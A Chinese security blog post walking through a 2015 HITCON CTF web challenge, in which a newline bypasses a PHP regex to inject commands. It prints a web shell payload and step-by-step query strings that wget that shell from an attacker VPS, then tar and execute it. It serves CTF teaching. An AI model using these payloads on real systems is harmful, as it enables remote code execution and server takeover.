---
title: 如何巧用 VPS 解题？
url: https://mp.weixin.qq.com/s/gmsSAAVGWqPXmnXmio_47w
source: Doonsec's feed
date: 2026-01-09
fetch_date: 2026-01-10T03:25:07.767726
---

# 如何巧用 VPS 解题？

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/TL4Y9UAcgrvq2jgZicIJLAcMAlFftNud924Y0EqdJXZ46MFPibMXTibXpWiao4QfFfeOD7mHZ4vASDj3onJZlUHWsw/0?wx_fmt=jpeg)

# 如何巧用 VPS 解题？

蚁景网安

![]()

在小说阅读器中沉浸阅读

以下文章来源于蚁景网络安全
，作者Lxxx

![](http://wx.qlogo.cn/mmhead/Q3auHgzwzM7Yk0SeU4ibQcLl1mDLlqhbAOdK1Ik3EO85soOvkh9e8wQ/0)

**蚁景网络安全**
.

致力于为你带来更实用的网络安全技术内容！

## 前言

对于Web方向的选手来说，拥有一台vps可以快速解决一些RCE问题，本篇文章所演示的是2015年HITCON的一道web题，虽然时隔有些久，但是这题所利用的trick以及RCE的思路，仍然值得我们去学习。

## 初步审计

题目代码如下：

```
<?php
    highlight_file(__FILE__);

    $dir = 'sandbox/' . $_SERVER['REMOTE_ADDR'];
    if ( !file_exists($dir) )
        mkdir($dir);
    chdir($dir);

    $args = $_GET['args'];
    for ( $i=0; $i<count($args); $i++ ){
        if ( !preg_match('/^\w+$/', $args[$i]) )
            exit();
    }
    exec("/bin/orange " . implode(" ", $args));
?>
```

题目代码比较短，一共就15行代码，但实际上最关键的代码就只有两行，如下：

```
if ( !preg_match('/^\w+$/', $args[$i]) )
exec("/bin/orange " . implode(" ", $args));
```

一个是正则匹配，一个是`exec`的命令执行

首先先看正则部分`/^\w+$/`，这一部分要求传入的args参数必须以字母数字下划线开头，除此之外，在最后还有一个美元符号`$`，需要明确的是：`$`符号在PCRE中是会匹配`\n`以及`\r`前的位置的，结合后面`exec`命令执行的部分，也就是说，我们可以使用换行符`%0a`绕过执行其他命令。

但是如果本题在正则表达式后加一个`D`修饰符，那么就无法使用`%0a`绕过，具体测试样例如下，这里就不过多阐述了，因为题目中没有这个修饰符。

```
echo preg_match("/^\w+$/", "abc".chr(10));//1
echo preg_match("/^\w+$/D", "abc".chr(10));//0
```

其次再粗略看一下命令执行的部分，这里命令执行的部分使用`exec`，单单使用一个`exec`是无法将命令执行的结果回显出来，因此在后续做题就可能会产生这么几种思路：数据外带、写入shell等等

### 数据外带

首先分析一下数据外带，多数情况下想要尝试数据外带都需要使用一些特殊的字符，例如使用反引号外带至dnslog，不过本题正则不允许args传入，因此数据外带这个方法行不通

### 写入shell

想要使用写入shell方法完成本题，还是有两种方式，一种方式就是使用`echo 'xxx' > xx.php`，然而这题正则过滤了这些字符，因此可以使用另一种方法，就是将下载远程服务器上的文件，通过一些操作进行RCE

## 详解RCE

本题官方解所使用的思路就是：下载远程服务器上的文件，通过一些操作进行RCE，具体是哪些操作下面会说到。

首先我们现在本地服务器上测试，此时新建一个php文件，命名为`1.php`，内容如下：

```
<?php
echo 3 * 4;
echo "\n";
?>
```

然后将`1.php`放入一个文件夹`a`中

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Lc3OR0icKk8O0S9vZ90ouWrvYsuVO8hzY5ER4tGgSqvSoZS3vGgs7rCFduwuy080uL2jTor7KcaOQA/640?wx_fmt=png)

这个时候我们将文件夹`a`利用`tar`打包，注意是**打包**，不是**压缩**

```
tar cf b a
将文件夹a打包，并且生成b
```

打包之后结果如下：

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Lc3OR0icKk8O0S9vZ90ouWrvDo8kHw4JtPuHdGz3EKxBoqZK5SYu4ibgdVOajCcIPBHOtIyGyUJr4uA/640?wx_fmt=png)

此时我们直接使用`php`命令去执行这个`b`

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Lc3OR0icKk8O0S9vZ90ouWrv41qn5AicQCjZ5iasN46OfJyhGUEWjt6wxgr180gRxe5NNBf1SKnaQBzA/640?wx_fmt=png)

看一下最后的12，就是前面`1.php`的执行结果`3 * 4 = 12`

那么为什么可以直接执行`b`这个文件呢？

其实我们可以直接使用`cat`查看`b`中的文件

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Lc3OR0icKk8O0S9vZ90ouWrvt0laqqJXkQBNKz3dODVTYeI7Z9ZcBeJ84V3IDmMJQZ21acWmkokelA/640?wx_fmt=png)

可以看到，`b`文件中存在之前写入的`1.php`的代码

这个时候我们总结一下这个方法，全程使用的命令对于正则`/^\w+$/`都是合法的，并且`1.php`中的内容可控，因此可以通过这个方法写入shell

因此，对于解题来说，解题流程如下：

首先在vps中新建一个`index.html`，文件内容如下：

```
<?php
file_put_contents('shell.php', '
    <?php
    header("Content-Type: text/plain");
    print shell_exec($_GET["cmd"]);
    ?>
');
?>
```

然后在vps中启动http服务

```
python3 -m http.server 80
```

由于ip都是`6.6.6.6`的形式，带`.`，不符合正则，因此可以使用十进制ip绕过

```
<?php
echo ip2long("6.6.6.6");
?>
//101058054
```

然后先新建一个`upload`目录，对应上面测试的`a`

```
?args[]=l%0a&args[]=mkdir&args[]=upload
```

然后进入`upload`目录，利用wget下载vps上的`index.html`

```
?args[]=l%0a&args[]=cd&args[]=upload%0a&args[]=wget&args[]=101058054
//注意：最后一个args为vps十进制ip值
```

将`upload`目录打包，打包后的名称为`b`

```
?args[]=l%0a&args[]=tar&args[]=cvf&args[]=b&args[]=upload
//将upload目录打包为b
```

在执行`b`目录，写入shell

```
?args[]=l%0a&args[]=php&args[]=b
//执行b，写入shell
```

这题本质上是利用了`tar`打包的特性，将下载下来的`index.html`打包，然后利用`php`执行

不过这只是官方解，除此之外，在2015年比赛的时候，还有一些队伍使用http302重定向到ftp中，将恶意文件下载到靶机中getshell。

由于Python自带的`http.server`默认将`index.html`作为首页，并且无法修改默认首页

但是，还有一种方法就是自建一个web服务器，不使用php解析，且访问80端口的默认文档为`shell.php`，然后再利用`wget`下载php文件进行getshell。

总之，方法总比困难多。

![图片](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC6iavic0tIJIoZCwKvUYnFFiaibgSm6mrFp1ZjAg4ITRicicuLN88YodIuqtF4DcUs9sruBa0bFLtX59lQQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=60)

学习网安实战课程，戳“阅读原文”

预览时标签不可点

阅读原文

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/TL4Y9UAcgruasR1ULCzS2icYoNn4Yz5aKdDv4u2Z8JA7ru620vsrtZjDIFMQzJFyicnn9YgOQQtbfraAJvNbwvAA/0?wx_fmt=png)

蚁景网安

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/TL4Y9UAcgruasR1ULCzS2icYoNn4Yz5aKdDv4u2Z8JA7ru620vsrtZjDIFMQzJFyicnn9YgOQQtbfraAJvNbwvAA/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过